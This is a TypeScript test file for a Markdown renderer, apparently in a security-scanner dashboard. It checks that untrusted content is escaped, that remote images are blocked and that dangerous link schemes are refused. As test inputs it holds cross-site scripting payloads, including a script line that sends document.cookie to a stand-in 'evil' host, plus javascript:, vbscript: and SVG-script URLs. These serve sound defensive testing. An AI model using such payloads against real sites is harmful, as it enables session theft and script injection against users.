/**
 * The renderer, against content a scanner could have produced (ADR 0020, slice 7b).
 *
 * `renderToStaticMarkup` rather than a DOM, for the reason `HealthChips.test.ts` gives: vitest runs
 * with `environment: 'node'` and there is no jsdom in this package. That is not a lesser substitute
 * here — every claim in this file is about WHAT IS IN THE MARKUP (an element that must not exist, an
 * attribute that must not be set, text that must be escaped), and server rendering produces exactly
 * the string the browser would parse. What it cannot show is the mermaid effect, which is why
 * `MermaidBlock`'s pre-render state is a *source* fallback that this file can see.
 */

import { describe, expect, it } from 'vitest';
import { createElement } from 'react';
import { renderToStaticMarkup } from 'react-dom/server';
import Markdown, { capMarkdown, mermaidChartOf, safeUrl, MARKDOWN_TEXT_CAP } from './Markdown';

function render(source: string): string {
  return renderToStaticMarkup(createElement(Markdown, { source }));
}

describe('raw HTML in pane text is text, never markup', () => {
  it('renders an <img onerror> as literal characters', () => {
    // The exact payload CONTRACT.md names. A scanner logging a crawled page's markup gets here.
    const html = renderToStaticMarkup(
      createElement(Markdown, { source: 'found: <img src=x onerror=alert(1)>' })
    );
    // NO ELEMENT, and no handler on any element. Note what is not asserted: that the string
    // `onerror=` is absent. It is present, and must be — as ESCAPED TEXT, which is the whole
    // requirement. The assertion that matters is that no tag carries it.
    expect(html).not.toMatch(/<img[^>]/);
    expect(html).not.toMatch(/<[a-zA-Z][^>]*\son[a-z]+\s*=/);
    // Visible as what it is: `<` escaped, the payload readable.
    expect(html).toContain('&lt;img src=x onerror=alert(1)&gt;');
  });

  it('renders a <script> block as literal characters', () => {
    const html = render('<script>fetch("https://evil/"+document.cookie)</script>');
    expect(html).not.toContain('<script');
    expect(html).toContain('&lt;script&gt;');
  });

  it('does not DELETE the html — deleting it would hide what the scanner saw', () => {
    // `skipHtml` would drop these nodes entirely. It is deliberately not set: an operator reading a
    // finding needs the payload, the same way a failing health signal keeps its sentence.
    const html = render('<iframe src="https://evil/"></iframe>');
    expect(html).toContain('&lt;iframe');
    expect(html).not.toContain('<iframe');
  });

  it('renders an inline event handler inside a table cell as text', () => {
    const html = render(['| finding |', '| --- |', '| <b onmouseover=x>hover</b> |'].join('\n'));
    expect(html).toContain('<table');
    // Again: the characters are there, on no element.
    expect(html).not.toMatch(/<[a-zA-Z][^>]*\son[a-z]+\s*=/);
    expect(html).toContain('&lt;b onmouseover=x&gt;');
  });
});

describe('no remote images — a remote image is a beacon', () => {
  it('blocks a remote image and says so in its place', () => {
    const html = render('![a crawled page](https://target.example/1x1.gif)');
    expect(html).not.toContain('<img');
    expect(html).toContain('data-testid="blocked-image"');
    expect(html).toContain('remote image blocked; nothing was requested');
    // The alt text survives, so the document still reads.
    expect(html).toContain('a crawled page');
    // The URL is NOT echoed: an attacker's string must not appear as somewhere to go.
    expect(html).not.toContain('target.example');
  });

  it('blocks a protocol-relative and a relative image too', () => {
    expect(render('![](//target.example/p.png)')).not.toContain('<img');
    expect(render('![](/api/panels/terminals)')).not.toContain('<img');
  });

  it('allows a small data: raster, which carries no request', () => {
    const png =
      'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8DwHwAFAAH/q842iQAAAABJRU5ErkJggg==';
    const html = render(`![pixel](${png})`);
    expect(html).toContain('data-testid="widget-image"');
    expect(html).toContain('data:image/png;base64,');
  });

  it('refuses a data: SVG, which is markup with its own script', () => {
    const svg = 'data:image/svg+xml;base64,PHN2Zz48c2NyaXB0PmFsZXJ0KDEpPC9zY3JpcHQ+PC9zdmc+';
    expect(safeUrl(svg, 'src')).toBeUndefined();
    expect(render(`![](${svg})`)).not.toContain('<img');
  });
});

describe('links are rendered, never followed', () => {
  it('keeps an http link with rel and no target', () => {
    const html = render('[the target](https://target.example/path)');
    expect(html).toContain('href="https://target.example/path"');
    expect(html).toContain('rel="noopener noreferrer"');
    expect(html).not.toContain('target=');
  });

  it('drops a javascript: href and renders the text', () => {
    const html = render('[click me](javascript:alert(1))');
    expect(html).not.toContain('javascript:');
    expect(html).toContain('data-testid="blocked-link"');
    expect(html).toContain('click me');
  });

  it('drops data:, vbscript: and relative hrefs', () => {
    expect(safeUrl('data:text/html,<script>alert(1)</script>', 'href')).toBeUndefined();
    expect(safeUrl('vbscript:msgbox(1)', 'href')).toBeUndefined();
    expect(safeUrl('/api/infra/stacks', 'href')).toBeUndefined();
    expect(safeUrl('#anchor', 'href')).toBeUndefined();
  });

  it('is not fooled by control characters, case or padding inside the scheme', () => {
    expect(safeUrl('  JaVaScRiPt:alert(1)', 'href')).toBeUndefined();
    expect(safeUrl(`java${String.fromCharCode(10)}script:alert(1)`, 'href')).toBeUndefined();
    expect(safeUrl(`https://ok.example/${String.fromCharCode(0)}`, 'href')).toBeUndefined();
  });

  it('denies every url attribute it does not know', () => {
    // Deny by default: an attribute this file has never heard of gets no URL.
    expect(safeUrl('https://ok.example', 'formaction')).toBeUndefined();
    expect(safeUrl('https://ok.example', 'action')).toBeUndefined();
  });

  it('keeps mailto, and nothing else exotic', () => {
    expect(safeUrl('mailto:oncall@example.com', 'href')).toBe('mailto:oncall@example.com');
    // react-markdown's own default allows these two; this one does not.
    expect(safeUrl('irc://irc.example/#chan', 'href')).toBeUndefined();
    expect(safeUrl('xmpp:someone@example', 'href')).toBeUndefined();
  });

  it('does not autolink a bare URL into a followable anchor without an href', () => {
    // GFM autolinks bare URLs. They are still subject to `safeUrl`, so this is a real anchor — the
    // assertion is that it carries `rel` like every other one.
    const html = render('see https://target.example/x for details');
    expect(html).toContain('rel="noopener noreferrer"');
  });
});

describe('the text is capped', () => {
  it('truncates past the cap and says how much was dropped', () => {
    const source = `${'a\n'.repeat(MARKDOWN_TEXT_CAP)}`;
    const html = render(source);
    expect(html).toContain('data-testid="markdown-truncated"');
    expect(html).toContain('characters were not rendered');
  });

  it('cuts at a line boundary, so a document is not cut mid-construct', () => {
    const source = `${'x'.repeat(40)}\n`.repeat(10);
    const { body, dropped } = capMarkdown(source, 100);
    expect(body.endsWith('\n')).toBe(false);
    expect(body.split('\n').every((l) => l === '' || l.length === 40)).toBe(true);
    expect(dropped).toBe(source.length - body.length);
  });

  it('leaves anything under the cap alone', () => {
    expect(capMarkdown('# hi', 100)).toEqual({ body: '# hi', dropped: 0 });
    expect(render('# hi')).not.toContain('markdown-truncated');
  });
});

describe('mermaid fences', () => {
  it('reads a chart off the hast node of a fence, and nothing else', () => {
    const node = {
      tagName: 'pre',
      children: [
        {
          tagName: 'code',
          properties: { className: ['language-mermaid'] },
          children: [{ type: 'text', value: 'flowchart LR\n  a --> b\n' }],
        },
      ],
    };
    expect(mermaidChartOf(node)).toBe('flowchart LR\n  a --> b');
    expect(mermaidChartOf({ tagName: 'pre', children: [{ tagName: 'code', children: [] }] })).toBeNull();
    expect(mermaidChartOf(undefined)).toBeNull();
  });

  it('renders a fence as its source before the lazy import resolves — never a blank box', () => {
    const html = render('```mermaid\nflowchart LR\n  a --> b\n```');
    expect(html).toContain('data-testid="mermaid"');
    expect(html).toContain('data-testid="mermaid-source"');
    expect(html).toContain('flowchart LR');
  });

  it('renders a non-mermaid fence as a code block', () => {
    const html = render('```sh\nssh root@host\n```');
    expect(html).not.toContain('data-testid="mermaid"');
    expect(html).toContain('<pre');
    expect(html).toContain('ssh root@host');
  });
});

describe('the rest of the markdown a summary uses', () => {
  it('renders GFM tables', () => {
    const html = render(['| a | b |', '| --- | --- |', '| 1 | 2 |'].join('\n'));
    expect(html).toContain('<table');
    expect(html).toContain('<th');
    expect(html).toContain('<td');
  });

  it('carries a test hook so a spec can find the rendered document', () => {
    expect(renderToStaticMarkup(createElement(Markdown, { source: 'x', testId: 'detail-markdown' }))).toContain(
      'data-testid="detail-markdown"'
    );
  });
});
